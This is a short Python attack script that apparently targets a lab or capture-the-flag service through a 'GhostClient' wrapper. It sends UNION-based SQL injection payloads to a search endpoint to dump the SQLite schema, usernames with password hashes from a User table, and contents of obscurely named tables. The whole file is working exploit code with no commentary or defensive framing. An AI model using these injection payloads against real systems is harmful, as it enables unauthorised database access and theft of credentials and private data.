from client import GhostClient
import json

c = GhostClient()
c.bootstrap()

def query(q):
    return c.request("search", {"q": f"' UNION SELECT 1, {q}--"})

tables = ["User", "knowledge_base", "\"logs??\"", "\"q_8f3c1a72d90e4b65\""]

# Get all tables from sqlite_master
res = c.request("search", {"q": "' UNION SELECT 1, type || ':' || name, sql FROM sqlite_master--"})
print("--- SQLITE SCHEMA ---")
for r in res["data"]["rows"]:
    print(r)

print("\n--- TABLE CONTENTS ---")
print("\n[User]")
res = c.request("search", {"q": "' UNION SELECT 1, id || ' | ' || username, hash FROM User--"})
for r in res["data"]["rows"]:
    print(r)

print("\n[logs??]")
res = c.request("search", {"q": "' UNION SELECT 1, cast(id as text), \"text???\" FROM \"logs??\"--"})
for r in res["data"]["rows"]:
    print(r)

print("\n[q_8f3c1a72d90e4b65]")
res = c.request("search", {"q": "' UNION SELECT 1, cast(id as text), \"r4\" FROM \"q_8f3c1a72d90e4b65\"--"})
for r in res["data"]["rows"]:
    print(r)
